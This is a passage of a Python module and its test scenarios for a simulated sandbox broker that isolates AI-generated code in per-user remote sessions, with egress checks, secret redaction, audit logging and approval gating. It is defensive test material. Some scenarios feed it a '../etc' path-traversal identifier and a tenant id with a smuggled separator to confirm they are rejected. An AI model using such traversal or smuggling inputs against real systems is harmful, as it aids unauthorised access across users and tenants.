        self._need(args, 1, line, "fetch URL")
        url = self._expand(args[0])
        allowed, reason = self.egress.decide(url)
        try:
            host = (urlsplit(url).hostname or "").lower()
        except ValueError:
            host = ""
        self.egress_attempts.append({"host": host, "allowed": allowed, "reason": reason})
        if not allowed:
            raise _ProgramError("NetworkError", "line %d: outbound connection blocked (%s)" % (line, reason))
        self.stdout.append("fetched https://%s (simulated response)" % host)

    def _op_write(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "write PATH TEXT")
        path = self._sandbox_path(args[0], line)
        content = self._expand(" ".join(args[1:])).encode("utf-8")
        self._store_file(path, content, _guess_mime(path), line)

    def _op_read(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "read PATH")
        path = self._sandbox_path(args[0], line)
        stored = self.session.files.get(path)
        if stored is None:
            raise _ProgramError("FileNotFoundError", "line %d: no such file in session: %s" % (line, path))
        self.stdout.append(stored.content.decode("utf-8", errors="replace"))

    def _op_emit(self, args: List[str], line: int) -> None:
        self._need(args, 3, line, "emit PATH MIME NBYTES")
        path = self._sandbox_path(args[0], line)
        size = self._int_arg(args[2], line)
        if size < 0:
            raise _ProgramError("ValueError", "line %d: negative size" % line)
        self._store_file(path, b"x" * size, args[1].lower(), line)
        self.artifacts.append({"path": path, "mime": args[1].lower(), "sizeBytes": size})

    def _op_spawn(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "spawn N")
        self.processes += max(0, self._int_arg(args[0], line))
        if self.processes > self.limits.max_processes:
            raise _ResourceLimit("process limit of %d reached" % self.limits.max_processes)

    def _op_alloc(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "alloc N")
        self.memory_units += max(0, self._int_arg(args[0], line))
        if self.memory_units > self.limits.max_memory_units:
            raise _ResourceLimit("memory limit of %d units reached" % self.limits.max_memory_units)

    def _op_getenv(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "getenv NAME")
        value = self.session.env.get(args[0])
        self.stdout.append("%s=%s" % (args[0], value if value is not None else "<unset>"))

    def _op_sha256(self, args: List[str], line: int) -> None:
        text = self._expand(" ".join(args)).encode("utf-8")
        self.stdout.append(hashlib.sha256(text).hexdigest())

    def _op_import(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "import PACKAGE")
        if args[0].lower() not in self.packages:
            raise _ProgramError("ModuleNotFoundError", "line %d: No module named '%s'" % (line, args[0]))

    def _op_propose(self, args: List[str], line: int) -> None:
        self._need(args, 1, line, "propose ACTION ARGS")
        self.proposals.append({"action": args[0], "args": self._expand(" ".join(args[1:]))})
        self.stdout.append("proposal recorded: %s" % args[0])


def run_program(
    code: str,
    session: SessionState,
    egress: EgressPolicy,
    limits: ExecutionLimits,
    packages: FrozenSet[str],
) -> ProgramOutcome:
    interpreter = _Interpreter(session, egress, limits, packages)
    status = "Succeeded"
    stderr = ""
    try:
        interpreter.run(parse_program(code))
    except _ParseError as err:
        status, stderr = "Failed", "SyntaxError: %s" % err
    except _ProgramError as err:
        status, stderr = "Failed", "%s: %s" % (err.kind, err.message)
    except _BudgetExceeded as err:
        status, stderr = "BudgetExceeded", "Terminated: %s" % err
    except _ResourceLimit as err:
        status, stderr = "ResourceLimitExceeded", "Terminated: %s" % err
    return ProgramOutcome(
        status=status,
        stdout="\n".join(interpreter.stdout),
        stderr=stderr,
        steps_used=interpreter.steps,
        artifacts=interpreter.artifacts,
        proposals=interpreter.proposals,
        egress_attempts=interpreter.egress_attempts,
    )


# ---------------------------------------------------------------------------
# Pool implementations
# ---------------------------------------------------------------------------


class InMemorySessionPool:
    """Fake session pool: per-identifier sandboxes with lifecycle and capacity."""

    isolation_boundary = "remote-sandbox (simulated)"

    def __init__(self, record: PoolRecord, roles: RoleAssignments, clock: LogicalClock) -> None:
        self.record = record
        self.spec = record.spec
        self.pool_name = record.spec.name
        self.pool_type = record.spec.pool_type
        self.scope = record.scope
        self._roles = roles
        self._clock = clock
        self._sessions: Dict[str, SessionState] = {}
        self.created_count = 0
        self.expired: List[Tuple[str, str]] = []

    # -- data-plane guards -------------------------------------------------

    def _authorize(self, token: Optional[CallerToken]) -> None:
        if token is None or not token.principal:
            raise Unauthorized("missing bearer token")
        if token.audience != SESSIONS_TOKEN_AUDIENCE:
            raise Unauthorized("token audience is not the sessions data plane", audience=token.audience)
        if not self._roles.has(token.principal, SESSION_EXECUTOR_ROLE, self.scope):
            raise Forbidden(
                "caller lacks the session executor role on this pool",
                role=SESSION_EXECUTOR_ROLE,
            )

    def _sweep(self) -> None:
        now = self._clock.now()
        for identifier, session in list(self._sessions.items()):
            if now - session.last_used_tick > self.spec.cooldown_ticks:
                reason = "cooldown"
            elif now - session.created_tick >= self.spec.max_lifetime_ticks:
                reason = "max-lifetime"
            else:
                continue
            del self._sessions[identifier]
            self.expired.append((identifier, reason))

    def _acquire(self, identifier: str) -> Tuple[SessionState, bool]:
        validate_session_identifier(identifier)
        self._sweep()
        now = self._clock.now()
        session = self._sessions.get(identifier)
        if session is not None:
            session.last_used_tick = now
            return session, False
        if len(self._sessions) >= self.spec.max_concurrent_sessions:
            raise CapacityExceeded(
                "pool has no free session slots; each active identifier holds a slot "
                "until its cooldown ends",
                active=len(self._sessions),
            )
        session = SessionState(
            identifier=identifier,
            created_tick=now,
            last_used_tick=now,
            env=dict(SANDBOX_SESSION_ENV),
        )
        self._sessions[identifier] = session
        self.created_count += 1
        return session, True

    # -- SessionPool -------------------------------------------------------

    def execute(self, token: Optional[CallerToken], request: ExecuteRequest) -> ExecuteResponse:
        self._authorize(token)
        session, is_new = self._acquire(request.identifier)
        outcome = run_program(
            request.code,
            session,
            self.spec.egress,
            self.spec.limits,
            self.spec.image_packages,
        )
        session.executions += 1
        cap = self.spec.limits.max_pool_stdout_bytes
        return ExecuteResponse(
            status=outcome.status,
            stdout=outcome.stdout.encode("utf-8")[:cap].decode("utf-8", errors="ignore"),
            stderr=outcome.stderr,
            session_is_new=is_new,
            steps_used=outcome.steps_used,
            artifacts=outcome.artifacts,
            proposals=outcome.proposals,
            egress_attempts=outcome.egress_attempts,
        )

    def upload_file(
        self, token: Optional[CallerToken], identifier: str, blob: FileBlob
    ) -> Dict[str, object]:
        self._authorize(token)
        path = normalize_session_path(blob.filename)
        session, is_new = self._acquire(identifier)
        limits = self.spec.limits
        if len(blob.content) > limits.max_file_bytes:
            raise FileTooLarge("file exceeds the session file size limit")
        if path not in session.files and len(session.files) >= limits.max_files:
            raise PolicyRejected("session file count limit reached")
        session.files[path] = SessionFile(path=path, content=blob.content, mime=blob.mime)
        return {"filename": path, "sizeInBytes": len(blob.content), "sessionIsNew": is_new}

    def download_file(self, token: Optional[CallerToken], identifier: str, path: str) -> FileBlob:
        self._authorize(token)
        canonical = normalize_session_path(path)
        session, is_new = self._acquire(identifier)
        stored = session.files.get(canonical)
        if stored is None:
            raise FileNotFoundInSession(
                "file not found in this session", path=canonical, session_is_new=is_new
            )
        return FileBlob(filename=canonical, mime=stored.mime, content=stored.content)

    def list_files(self, token: Optional[CallerToken], identifier: str) -> List[str]:
        self._authorize(token)
        session, _ = self._acquire(identifier)
        return sorted(session.files)

    def delete_session(self, token: Optional[CallerToken], identifier: str) -> bool:
        self._authorize(token)
        validate_session_identifier(identifier)
        return self._sessions.pop(identifier, None) is not None

    def mcp_endpoint(self) -> str:
        if not self.record.effective_mcp_enabled:
            raise McpNotAvailable(
                "built-in MCP endpoint is not available on this pool; in preview it was "
                "only observed on the built-in Python pool",
                pool_type=self.pool_type,
            )
        return POOL_MANAGEMENT_ENDPOINT + "/mcp"

    # -- test helpers --------------------------------------------------------

    def has_session(self, identifier: str) -> bool:
        return identifier in self._sessions

    def active_session_count(self) -> int:
        return len(self._sessions)

    def peek_env(self, identifier: str) -> Dict[str, str]:
        return dict(self._sessions[identifier].env)


class InProcessExecutor:
    """ANTI-PATTERN seam. Running generated code inside the agent process.

    It exists only so the broker can prove it refuses it. Every method raises,
    and nothing here ever evaluates code.
    """

    isolation_boundary = "none"
    pool_name = "in-process"
    pool_type = "InProcess"

    def _refuse(self, *args: object, **kwargs: object) -> object:
        raise InProcessExecutionRefused(
            "generated code must never run inside the agent process: it would share the "
            "agent's identity, network line-of-sight, secrets, filesystem and memory"
        )

    execute = _refuse
    upload_file = _refuse
    download_file = _refuse
    list_files = _refuse
    delete_session = _refuse
    mcp_endpoint = _refuse


def in_process_exposure(code: str, host_env: Dict[str, str]) -> Dict[str, object]:
    """Statically report what the code WOULD reach if run in-process. Never runs it."""

    reads_env = False
    hosts: List[str] = []
    writes_files = False
    for raw in code.splitlines():
        tokens = raw.strip().split()
        if not tokens:
            continue
        op = tokens[0].lower()
        if op == "getenv":
            reads_env = True
        elif op == "fetch" and len(tokens) > 1:
            try:
                hosts.append((urlsplit(tokens[1]).hostname or "").lower())
            except ValueError:
                hosts.append("<unparseable>")
        elif op in ("write", "emit"):
            writes_files = True
    exposed_env = sorted(host_env) if reads_env else []
    return {
        "executed": False,
        "wouldExposeEnv": exposed_env,
        "wouldMintIdentityTokens": reads_env
        and all(name in host_env for name in CREDENTIAL_BEARING_ENV),
        "wouldReachHosts": hosts,
        "wouldWriteAgentFilesystem": writes_files,
        "wouldShareAgentMemory": True,
    }


class AcaSessionPoolAdapter:
    """Gated stub for a real Azure Container Apps session pool.

    Construction fails unless SANDBOX_SIM_LIVE=1. Even then every data-plane
    method raises NotImplementedError: wire the HTTP calls yourself against
    current Microsoft Learn documentation (paths, api-version, field names,
    token scope and role name are all preview-era and must be verified).
    This class makes no network calls.
    """

    isolation_boundary = "remote-sandbox"

    def __init__(
        self,
        pool_management_endpoint: str = POOL_MANAGEMENT_ENDPOINT,
        pool_name: str = "<pool-name>",
        pool_type: str = "PythonLTS",
        api_version: str = API_VERSION_PLACEHOLDER,
    ) -> None:
        if os.environ.get(LIVE_ENV_VAR) != "1":
            raise LiveAdapterGated(
                "AcaSessionPoolAdapter is gated; set %s=1 only after implementing the "
                "data-plane calls against current documentation" % LIVE_ENV_VAR
            )
        self.endpoint = pool_management_endpoint
        self.pool_name = pool_name
        self.pool_type = pool_type
        self.api_version = api_version

    def _not_wired(self, operation: str) -> NotImplementedError:
        return NotImplementedError(
            "%s is not implemented: call the sessions data plane at %s with a token for %s "
            "and the identifier as a query parameter (verify the current API shape)"
            % (operation, self.endpoint, SESSIONS_TOKEN_SCOPE)
        )

    def execute(self, token: Optional[CallerToken], request: ExecuteRequest) -> ExecuteResponse:
        raise self._not_wired("execute")

    def upload_file(
        self, token: Optional[CallerToken], identifier: str, blob: FileBlob
    ) -> Dict[str, object]:
        raise self._not_wired("upload_file")

    def download_file(self, token: Optional[CallerToken], identifier: str, path: str) -> FileBlob:
        raise self._not_wired("download_file")

    def list_files(self, token: Optional[CallerToken], identifier: str) -> List[str]:
        raise self._not_wired("list_files")

    def delete_session(self, token: Optional[CallerToken], identifier: str) -> bool:
        raise self._not_wired("delete_session")

    def mcp_endpoint(self) -> str:
        raise self._not_wired("mcp_endpoint")


# ---------------------------------------------------------------------------
# Pool selection, pre-screen and output handling
# ---------------------------------------------------------------------------


def select_pool(needs: WorkloadNeeds, available_types: Sequence[str]) -> PoolDecision:
    """Choose a pool type and access path from workload needs.

    ``available_types`` must come from the resource provider (see
    ``FakeResourceProvider.discover_pool_types``), not from documentation.
    """

    language = needs.language.lower()
    custom_packages = sorted(set(p.lower() for p in needs.packages) - BUILTIN_POOL_PACKAGES)
    reasons: List[str] = []
    warnings: List[str] = []
    if language != "python":
        pool_type = LANGUAGE_POOL_TYPES.get(language)
        if pool_type is None or pool_type not in available_types:
            raise InvalidPoolType(
                "no pool type for this language in the target region",
                language=language,
                valid_types=list(available_types),
            )
        reasons.append("language '%s' maps to %s per the resource provider" % (language, pool_type))
        if needs.needs_mcp:
            warnings.append("built-in MCP was only observed on the Python pool; front it yourself")
            return PoolDecision(pool_type, "own-mcp-or-openapi-front", reasons, warnings)
        return PoolDecision(pool_type, "direct-data-plane", reasons, warnings)

    def require(pool_type: str) -> None:
        if pool_type not in available_types:
            raise InvalidPoolType(
                "required pool type is not offered in the target region",
                requested=pool_type,
                valid_types=list(available_types),
            )

    if custom_packages and needs.needs_mcp:
        require("CustomContainer")
        reasons.append("packages not in the built-in image: %s" % ", ".join(custom_packages))
        reasons.append("MCP needed but not available on custom-container pools (observed)")
        warnings.append(
            "front the custom pool with your own MCP or OpenAPI tool that pins the "
            "session identifier server-side"
        )
        return PoolDecision("CustomContainer", "own-mcp-or-openapi-front", reasons, warnings)
    if custom_packages:
        require("CustomContainer")
        reasons.append("packages not in the built-in image: %s" % ", ".join(custom_packages))
        warnings.append("custom pools keep at least one warm instance; plan capacity, not warmth")
        return PoolDecision("CustomContainer", "direct-data-plane", reasons, warnings)
    require("PythonLTS")
    if needs.needs_mcp:
        reasons.append("MCP needed and the built-in Python pool exposes it (observed)")
        warnings.append("the MCP connection credential is a key: store it as a secret")
        return PoolDecision("PythonLTS", "aca-built-in-mcp", reasons, warnings)
    reasons.append("built-in image covers the packages; no MCP needed")
    return PoolDecision("PythonLTS", "direct-data-plane", reasons, warnings)


def prescreen_code(code: str, policy: BrokerPolicy) -> PrescreenVerdict:
    """Cheap static checks before the pool call. The sandbox stays the control."""

    encoded = code.encode("utf-8")
    digest = hashlib.sha256(encoded).hexdigest()
    if len(encoded) > policy.max_code_bytes:
        raise CodeTooLarge(
            "code exceeds the broker size limit",
            code_bytes=len(encoded),
            max_code_bytes=policy.max_code_bytes,
        )
    matched = [name for name, pattern in SECRET_PATTERNS if pattern.search(code)]
    if matched:
        raise SecretInCode(
            "code contains credential-like material; secrets must never enter a session",
            patterns=matched,
        )
    lowered = code.lower()
    findings = sorted({label for needle, label in SUSPICIOUS_INDICATORS if needle in lowered})
    return PrescreenVerdict(allowed=True, code_bytes=len(encoded), code_sha256=digest, findings=findings)


def sanitize_stdout(text: str, max_bytes: int) -> Tuple[str, bool, List[str]]:
    """Redact credential-like material, then truncate. Returns (text, truncated, redactions)."""

    redactions: List[str] = []
    for name, pattern in SECRET_PATTERNS:
        text, count = pattern.subn("[REDACTED:%s]" % name, text)
        if count:
            redactions.append(name)
    encoded = text.encode("utf-8")
    if len(encoded) <= max_bytes:
        return text, False, redactions
    clipped = encoded[:max_bytes].decode("utf-8", errors="ignore")
    return clipped + TRUNCATION_MARKER, True, redactions


def classify_artifact(mime: str, size: int, policy: BrokerPolicy) -> Tuple[str, str]:
    """Return ("deliver" | "quarantine", reason). Artifacts are untrusted data."""

    lowered = mime.lower()
    if lowered not in policy.artifact_mime_allowlist:
        return "quarantine", "mime-not-allowlisted"
    if size > policy.max_download_bytes:
        return "quarantine", "too-large"
    return "deliver", "allowlisted"


_NUMBER_RE = re.compile(r"-?\d+(?:\.\d+)?")


def evaluate_answer(answer: str, trace: Sequence[Dict[str, object]]) -> Tuple[bool, str]:
    """Functional eval: a numeric answer must be backed by a succeeded execution.

    Every number in the answer must appear in the stdout of a succeeded
    execution in the trace; otherwise the model may have guessed.
    """

    succeeded = [step for step in trace if step.get("type") == "code_execution" and step.get("status") == "Succeeded"]
    if not succeeded:
        return False, "no succeeded code execution in trace"
    evidence = " ".join(str(step.get("stdout", "")) for step in succeeded)
    evidence_numbers = set(_NUMBER_RE.findall(evidence))
    missing = [number for number in _NUMBER_RE.findall(answer) if number not in evidence_numbers]
    if missing:
        return False, "answer numbers not found in execution output: %s" % ", ".join(missing)
    return True, "answer grounded in execution output"


# ---------------------------------------------------------------------------
# The broker: the only component allowed to talk to the pool
# ---------------------------------------------------------------------------

STATE_LOST_NOTICE = (
    "The sandbox session for this conversation expired and was re-created. Files "
    "and variables from earlier turns are gone; re-upload inputs or recompute."
)


def _short_hash(value: str) -> str:
    return hashlib.sha256(value.encode("utf-8")).hexdigest()[:12]


class SandboxBroker:
    """Sits between the agent and the pool.

    The broker derives the session identifier, obtains the data-plane token
    with its own identity, pre-screens code, sanitizes outputs, routes
    side-effect proposals to approval and writes audit records. The model only
    ever supplies code text and file content.
    """

    def __init__(
        self,
        pool: SessionPool,
        token_provider: TokenProvider,
        key_provider: DerivationKeyProvider,
        audit: AuditSink,
        approvals: ApprovalGate,
        policy: Optional[BrokerPolicy] = None,
    ) -> None:
        boundary = getattr(pool, "isolation_boundary", "none")
        if boundary not in ALLOWED_BOUNDARIES:
            raise InProcessExecutionRefused(
                "broker refuses an execution backend without a remote sandbox boundary",
                isolation_boundary=boundary,
            )
        self.pool = pool
        self.policy = policy or BrokerPolicy()
        self._tokens = token_provider
        self._deriver = SessionIdDeriver(key_provider)
        self._audit = audit
        self._approvals = approvals
        self._seen: Set[str] = set()
        self._counter = 0

    # -- internals ---------------------------------------------------------

    def _correlation_id(self, user: EndUser) -> str:
        self._counter += 1
        material = SESSION_ID_SEPARATOR.join(
            (user.tenant_id, user.user_id, user.conversation_id, str(self._counter))
        )
        return "corr-" + hashlib.sha256(material.encode("utf-8")).hexdigest()[:16]

    def _record(
        self,
        correlation_id: str,
        event: str,
        user: EndUser,
        identifier: Optional[str],
        outcome: str,
        **details: object,
    ) -> None:
        self._audit.emit(
            AuditRecord(
                correlation_id=correlation_id,
                event=event,
                tenant_ref=_short_hash(user.tenant_id),
                user_ref=_short_hash(user.tenant_id + SESSION_ID_SEPARATOR + user.user_id),
                session_ref=_short_hash(identifier) if identifier else "-",
                pool=self.pool.pool_name,
                outcome=outcome,
                details=dict(details),
            )
        )

    @staticmethod
    def _failure(correlation_id: str, err: SandboxError) -> Dict[str, object]:
        result: Dict[str, object] = {"ok": False, "correlationId": correlation_id}
        result.update(err.to_dict())
        return result

    def _token(self) -> CallerToken:
        return self._tokens.get_token(SESSIONS_TOKEN_SCOPE)

    def session_identifier_for(self, user: EndUser) -> str:
        return self._deriver.derive(user)

    # -- operations --------------------------------------------------------

    def run_code(
        self,
        user: EndUser,
        code: str,
        session_identifier: Optional[str] = None,
        correlation_id: Optional[str] = None,
    ) -> Dict[str, object]:
        corr = correlation_id or self._correlation_id(user)
        code_sha = hashlib.sha256(code.encode("utf-8")).hexdigest()
        code_bytes = len(code.encode("utf-8"))
        identifier: Optional[str] = None
        try:
            if session_identifier is not None:
                raise ClientSuppliedSessionId(
                    "session identifiers are derived server-side; neither the caller nor "
                    "the model may supply one"
                )
            verdict = prescreen_code(code, self.policy)
            identifier = self._deriver.derive(user)
            response = self.pool.execute(self._token(), ExecuteRequest(identifier=identifier, code=code))
        except SandboxError as err:
            self._record(corr, "execute", user, identifier, err.code, code_sha256=code_sha, code_bytes=code_bytes)
            return self._failure(corr, err)

        state_lost = response.session_is_new and identifier in self._seen
        self._seen.add(identifier)
        stdout, truncated, redactions = sanitize_stdout(response.stdout, self.policy.max_stdout_bytes)
        stderr, _, stderr_redactions = sanitize_stdout(response.stderr, self.policy.max_stdout_bytes)
        artifacts: List[Dict[str, object]] = []
        for artifact in response.artifacts:
            disposition, reason = classify_artifact(
                str(artifact["mime"]), int(artifact["sizeBytes"]), self.policy  # type: ignore[call-overload]
            )
            item = dict(artifact)
            item.update({"disposition": disposition, "reason": reason})
            artifacts.append(item)
        tickets: List[str] = []
        for proposal in response.proposals:
            envelope: Dict[str, object] = {
                "correlationId": corr,
                "sessionRef": _short_hash(identifier),
                "source": "sandbox-output",
            }
            envelope.update(proposal)
            tickets.append(self._approvals.submit(envelope))
        denied = [attempt for attempt in response.egress_attempts if not attempt["allowed"]]
        result: Dict[str, object] = {
            "ok": response.status == "Succeeded",
            "correlationId": corr,
            "status": response.status,
            "stdout": stdout,
            "stderr": stderr,
            "stdoutTruncated": truncated,
            "redactions": sorted(set(redactions + stderr_redactions)),
            "sessionIsNew": response.session_is_new,
            "stateLost": state_lost,
            "artifacts": artifacts,
            "pendingApprovals": tickets,
            "prescreenFindings": verdict.findings,
            "egressAttempts": response.egress_attempts,
            "stepsUsed": response.steps_used,
        }
        if state_lost:
            result["notice"] = STATE_LOST_NOTICE
        self._record(
            corr,
            "execute",
            user,
            identifier,
            response.status,
            code_sha256=verdict.code_sha256,
            code_bytes=verdict.code_bytes,
            steps_used=response.steps_used,
            prescreen_findings=verdict.findings,
            egress_denied=len(denied),
            stdout_truncated=truncated,
            redactions=result["redactions"],
            state_lost=state_lost,
            pending_approvals=len(tickets),
            quarantined_artifacts=sum(1 for a in artifacts if a["disposition"] == "quarantine"),
        )
        return result

    def upload(self, user: EndUser, filename: str, mime: str, content: bytes) -> Dict[str, object]:
        corr = self._correlation_id(user)
        identifier: Optional[str] = None
        try:
            if mime.lower() not in self.policy.upload_mime_allowlist:
                raise MimeRejected("upload type is not on the allowlist", mime=mime)
            if len(content) > self.policy.max_upload_bytes:
                raise FileTooLarge("upload exceeds the broker size limit", size_bytes=len(content))
            path = normalize_session_path(filename)
            identifier = self._deriver.derive(user)
            receipt = self.pool.upload_file(
                self._token(), identifier, FileBlob(filename=path, mime=mime.lower(), content=content)
            )
        except SandboxError as err:
            self._record(corr, "upload", user, identifier, err.code, mime=mime, size_bytes=len(content))
            return self._failure(corr, err)
        state_lost = bool(receipt["sessionIsNew"]) and identifier in self._seen
        self._seen.add(identifier)
        self._record(
            corr, "upload", user, identifier, "Succeeded",
            path=receipt["filename"], mime=mime.lower(), size_bytes=len(content), state_lost=state_lost,
        )
        return {
            "ok": True,
            "correlationId": corr,
            "path": receipt["filename"],
            "sizeBytes": receipt["sizeInBytes"],
            "sessionIsNew": receipt["sessionIsNew"],
            "stateLost": state_lost,
        }

    def download(self, user: EndUser, path: str) -> Dict[str, object]:
        corr = self._correlation_id(user)
        identifier: Optional[str] = None
        try:
            identifier = self._deriver.derive(user)
            blob = self.pool.download_file(self._token(), identifier, path)
        except FileNotFoundInSession as err:
            state_lost = bool(err.details.get("session_is_new")) and identifier in self._seen
            if identifier:
                self._seen.add(identifier)
            self._record(corr, "download", user, identifier, err.code, state_lost=state_lost)
            result = self._failure(corr, err)
            result["stateLost"] = state_lost
            if state_lost:
                result["notice"] = STATE_LOST_NOTICE
            return result
        except SandboxError as err:
            self._record(corr, "download", user, identifier, err.code)
            return self._failure(corr, err)
        disposition, reason = classify_artifact(blob.mime, len(blob.content), self.policy)
        if disposition == "quarantine":
            self._record(
                corr, "download", user, identifier, "Quarantined",
                path=blob.filename, mime=blob.mime, size_bytes=len(blob.content), reason=reason,
            )
            return {
                "ok": False,
                "correlationId": corr,
                "quarantined": True,
                "reason": reason,
                "path": blob.filename,
                "mime": blob.mime,
            }
        self._record(
            corr, "download", user, identifier, "Delivered",
            path=blob.filename, mime=blob.mime, size_bytes=len(blob.content),
        )
        return {
            "ok": True,
            "correlationId": corr,
            "path": blob.filename,
            "mime": blob.mime,
            "sizeBytes": len(blob.content),
            "content": blob.content,
        }

    def end_conversation(self, user: EndUser) -> Dict[str, object]:
        corr = self._correlation_id(user)
        identifier: Optional[str] = None
        try:
            identifier = self._deriver.derive(user)
            deleted = self.pool.delete_session(self._token(), identifier)
        except SandboxError as err:
            self._record(corr, "delete", user, identifier, err.code)
            return self._failure(corr, err)
        self._seen.discard(identifier)
        self._record(corr, "delete", user, identifier, "Deleted" if deleted else "NotFound")
        return {"ok": True, "correlationId": corr, "deleted": deleted}

    def mcp_tool_descriptor(self, user: EndUser) -> Dict[str, object]:
        """Tool definition for a prompt agent, with the identifier pinned by the app."""

        corr = self._correlation_id(user)
        try:
            server_url = self.pool.mcp_endpoint()
            identifier = self._deriver.derive(user)
        except SandboxError as err:
            self._record(corr, "mcp-descriptor", user, None, err.code)
            return self._failure(corr, err)
        self._record(corr, "mcp-descriptor", user, identifier, "Issued")
        return {
            "ok": True,
            "correlationId": corr,
            "type": "mcp",
            "server_url": server_url,
            "pinnedSessionIdentifier": identifier,
            "modelMaySetIdentifier": False,
            "connectionCredential": "<reference to a key held in Key Vault>",
        }


# ---------------------------------------------------------------------------
# Fictional world
# ---------------------------------------------------------------------------

U1_SALES = EndUser(TENANT_CONTOSO, USER_A, CONV_SALES)
U1_FORECAST = EndUser(TENANT_CONTOSO, USER_A, CONV_FORECAST)
U2_SALES = EndUser(TENANT_CONTOSO, USER_B, CONV_SALES)
U3_SALES = EndUser(TENANT_CONTOSO, "contoso-analyst-3", CONV_SALES)
FAB_U1_SALES = EndUser(TENANT_FABRIKAM, USER_A, CONV_SALES)


@dataclass
class World:
    clock: LogicalClock
    roles: RoleAssignments
    provider: FakeResourceProvider
    record: PoolRecord
    pool: InMemorySessionPool
    tokens: StaticTokenProvider
    keys: StaticDerivationKeyProvider
    audit: AuditLog
    approvals: InMemoryApprovalGate
    broker: SandboxBroker


def build_world(
    pool_type: str = "PythonLTS",
    egress: Optional[EgressPolicy] = None,
    grant_role: bool = True,
    principal: str = BROKER_IDENTITY,
    audience: str = SESSIONS_TOKEN_AUDIENCE,
    policy: Optional[BrokerPolicy] = None,
    limits: Optional[ExecutionLimits] = None,
    max_sessions: int = 4,
    mcp_enabled: bool = False,
    ready: Optional[int] = None,
    packages: Optional[FrozenSet[str]] = None,
    name: str = "pool-contoso-analysis",
) -> World:
    clock = LogicalClock()
    roles = RoleAssignments()
    provider = FakeResourceProvider("region-a")
    if ready is None:
        ready = 1 if pool_type == "CustomContainer" else 0
    if packages is None:
        packages = CUSTOM_IMAGE_PACKAGES if pool_type == "CustomContainer" else BUILTIN_POOL_PACKAGES
    spec = PoolSpec(
        name=name,
        pool_type=pool_type,
        max_concurrent_sessions=max_sessions,
        ready_session_instances=ready,
        egress=egress or EgressPolicy(),
        mcp_enabled=mcp_enabled,
        image_packages=packages,
        limits=limits or ExecutionLimits(),
    )
    record = provider.create_pool(spec)
    if grant_role:
        roles.grant(BROKER_IDENTITY, SESSION_EXECUTOR_ROLE, record.scope)
    pool = InMemorySessionPool(record, roles, clock)
    tokens = StaticTokenProvider(principal, audience)
    keys = StaticDerivationKeyProvider(DEMO_DERIVATION_KEY)
    audit = AuditLog()
    approvals = InMemoryApprovalGate()
    broker = SandboxBroker(pool, tokens, keys, audit, approvals, policy)
    return World(clock, roles, provider, record, pool, tokens, keys, audit, approvals, broker)


def check(condition: object, message: str) -> None:
    if not condition:
        raise AssertionError(message)


def expect_error(result: Dict[str, object], code: str) -> Dict[str, object]:
    check(result.get("ok") is False, "expected a failure result, got %r" % result)
    error = result.get("error")
    check(isinstance(error, dict), "expected an error envelope, got %r" % result)
    check(error["code"] == code, "expected %s, got %s" % (code, error["code"]))  # type: ignore[index]
    return error  # type: ignore[return-value]


# ---------------------------------------------------------------------------
# Scenarios
# ---------------------------------------------------------------------------


def scenario_same_user_and_conversation_reuse_one_session() -> None:
    w = build_world()
    first = w.broker.run_code(U1_SALES, "set total 40\nadd total 2\nprint total=$total")
    second = w.broker.run_code(U1_SALES, "add total 8\nprint total=$total")
    check(first["ok"] and second["ok"], "both executions should succeed")
    check(first["sessionIsNew"] and not second["sessionIsNew"], "second call must reuse the session")
    check(second["stdout"] == "total=50", "state must persist within the conversation")
    check(w.pool.created_count == 1, "exactly one session for one conversation")
    other_conv = w.broker.run_code(U1_FORECAST, "print total=$total")
    check(other_conv["sessionIsNew"], "a new conversation gets its own session")
    check(other_conv["stdout"] == "total=", "no state leaks between conversations")


def scenario_different_users_never_share_a_session() -> None:
    w = build_world()
    w.broker.run_code(U1_SALES, "set margin_plan draft-one\nwrite notes.txt analyst one private draft")
    probe = w.broker.run_code(U2_SALES, "print plan=$margin_plan\nread notes.txt")
    check(probe["status"] == "Failed", "second user must not read the first user's file")
    check("FileNotFoundError" in str(probe["stderr"]), "missing file should surface as not found")
    check(probe["stdout"] == "plan=", "second user must not see the first user's variables")
    check(
        w.broker.session_identifier_for(U1_SALES) != w.broker.session_identifier_for(U2_SALES),
        "users in the same conversation id must still get different identifiers",
    )
    check(w.pool.created_count == 2, "two users means two sessions")


def scenario_tenants_are_isolated_even_with_identical_ids() -> None:
    w = build_world()
    contoso_id = w.broker.session_identifier_for(U1_SALES)
    fabrikam_id = w.broker.session_identifier_for(FAB_U1_SALES)
    check(contoso_id != fabrikam_id, "same user and conversation ids in another tenant must differ")
    w.broker.run_code(U1_SALES, "write q3.csv region,revenue")
    probe = w.broker.run_code(FAB_U1_SALES, "read q3.csv")
    check(probe["status"] == "Failed", "a tenant must not read another tenant's files")
    smuggled = EndUser(TENANT_CONTOSO + SESSION_ID_SEPARATOR + "x", USER_A, CONV_SALES)
    try:
        w.broker.session_identifier_for(smuggled)
    except PolicyRejected:
        pass
    else:
        raise AssertionError("separator smuggling in tenant id must be rejected")
    rotated = SessionIdDeriver(StaticDerivationKeyProvider(ALTERNATE_DERIVATION_KEY)).derive(U1_SALES)
    check(rotated != contoso_id, "rotating the derivation key changes every identifier")


def scenario_client_supplied_session_id_is_rejected() -> None:
    w = build_world()
    victim = w.broker.session_identifier_for(U1_SALES)
    result = w.broker.run_code(U2_SALES, "print hello", session_identifier=victim)
    expect_error(result, "ClientSuppliedSessionId")
    check(w.pool.active_session_count() == 0, "no session may be touched with a supplied id")


def scenario_session_id_is_opaque_and_within_bounds() -> None:
    w = build_world()
    identifier = w.broker.session_identifier_for(U1_SALES)
    check(SESSION_ID_MIN_CHARS <= len(identifier) <= SESSION_ID_MAX_CHARS, "identifier length bounds")
    check(SESSION_ID_PATTERN.match(identifier) is not None, "identifier charset")
    for raw in (TENANT_CONTOSO, USER_A, CONV_SALES):
        check(raw not in identifier, "raw identity values must not appear in the identifier")
    check(identifier == w.broker.session_identifier_for(U1_SALES), "derivation must be stable")
    token = w.tokens.get_token(SESSIONS_TOKEN_SCOPE)
    for bad in ("ab", "x" * (SESSION_ID_MAX_CHARS + 1), "has space", "../etc"):
        try:
            w.pool.execute(token, ExecuteRequest(identifier=bad, code="print hi"))
        except InvalidSessionIdentifier:
            continue
        raise AssertionError("pool accepted an invalid identifier: %r" % bad)


def scenario_caller_without_token_or_role_is_refused() -> None:
